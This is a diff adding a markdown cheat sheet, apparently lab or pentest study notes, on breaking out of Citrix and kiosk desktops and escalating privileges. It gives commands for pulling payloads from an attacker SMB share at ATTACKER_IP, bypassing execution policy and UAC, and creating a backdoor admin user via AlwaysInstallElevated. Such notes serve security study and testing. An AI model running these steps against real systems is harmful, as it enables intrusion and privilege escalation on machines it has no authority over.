@@ -1,0 +1,107 @@
+🔹 Summary (What You’re Learning Here)
+You're learning how to break out of restricted/kioskized desktop environments (Citrix, RDS, AWS AppStream, PSM, Kiosk) to:
+
+Bypass GUI lockdowns
+
+Access command execution
+
+Move laterally or escalate privileges
+
+Bypass UAC or get SYSTEM
+
+Most orgs think Citrix = security. You’re here to prove otherwise.
+
+⚙️ Got This, Do That (Methodical Flow)
+Got This	Do That
+File Explorer is locked down	Use Save/Open dialogs via Paint, Notepad, Wordpad
+Dialog Box (File Picker) opens	Input UNC path: \\127.0.0.1\c$\users\USERNAME or to attacker share
+Need to transfer tools	Run smbserver.py on your box → Browse to \\ATTACKER_IP\share
+Can’t copy via dialog	Right-click and run payload directly (pwn.exe, .bat, .ps1, etc.)
+Need full GUI file access	Use portable Explorer++.exe from your SMB share
+Can’t launch Regedit	Use SmallRegistryEditor or UberRegEdit
+Have a .lnk (shortcut) file	Change the “Target” to cmd.exe via Properties
+No shortcut available	Drop .lnk via SMB or generate with PowerShell
+CMD access achieved	Drop and run PowerUp.ps1, winPEAS, or Bypass-UAC.ps1
+Registry keys show AlwaysInstallElevated = 1	Use Write-UserAddMSI to create .msi → Run it to make admin user
+Backdoor admin still blocked by UAC	Use Bypass-UAC.ps1 with method UacMethodSysprep
+You need proof of SYSTEM	whoami /priv + read C:\Users\Administrator\Desktop\flag.txt
+🧠 Patterns & Hints
+Dialog Boxes = Breakout Gold. Look for “Open,” “Save,” “Print,” or “Browse” in ANY GUI app.
+
+Use UNC paths to bypass drive restrictions (e.g., \\127.0.0.1\c$).
+
+Use portable apps from SMB shares to escalate further.
+
+Scripts auto-executing by extension is a privilege escalator (e.g., .bat, .ps1).
+
+Default AlwaysInstallElevated = 1? Big green light to create local admins.
+
+Shortcut trick is one of the stealthier methods — very overlooked.
+
+UAC is your final boss — but several off-the-shelf scripts (like PowerUp and Bypass-UAC) handle it clean.
+
+🧨 Privilege Escalation Flow from Citrix Box
+pgsql
+Copy
+Edit
+Dialog Box Access ➜ Run `cmd.exe` from UNC path or payload
+    ↓
+Drop tools via SMB share ➜ `Explorer++`, `PowerUp.ps1`, `Bypass-UAC.ps1`
+    ↓
+Enumerate: Run PowerUp ➜ Look for AlwaysInstallElevated
+    ↓
+Exploit AlwaysInstallElevated ➜ `Write-UserAddMSI` ➜ Create admin user
+    ↓
+Runas to backdoor ➜ Bypass UAC ➜ Gain access to SYSTEM resources
+🔍 One-Liners & Quick Recon
+Access local system via Paint dialog:
+
+plaintext
+Copy
+Edit
+\\127.0.0.1\c$\users\USERNAME
+Access attack share via dialog box:
+
+plaintext
+Copy
+Edit
+\\ATTACKER_IP\share
+Start SMB server:
+
+bash
+Copy
+Edit
+smbserver.py -smb2support share $(pwd)
+Bypass Execution Policy on PS script:
+
+powershell
+Copy
+Edit
+Set-ExecutionPolicy Bypass -Scope Process
+Validate AlwaysInstallElevated:
+
+cmd
+Copy
+Edit
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+Bypass UAC (PowerShell):
+
+powershell
+Copy
+Edit
+Import-Module .\Bypass-UAC.ps1
+Bypass-UAC -Method UacMethodSysprep
+Generate .msi to add admin user:
+
+powershell
+Copy
+Edit
+Import-Module .\PowerUp.ps1
+Write-UserAddMSI
+Create a .bat that opens CMD:
+
+bat
+Copy
+Edit
+cmd
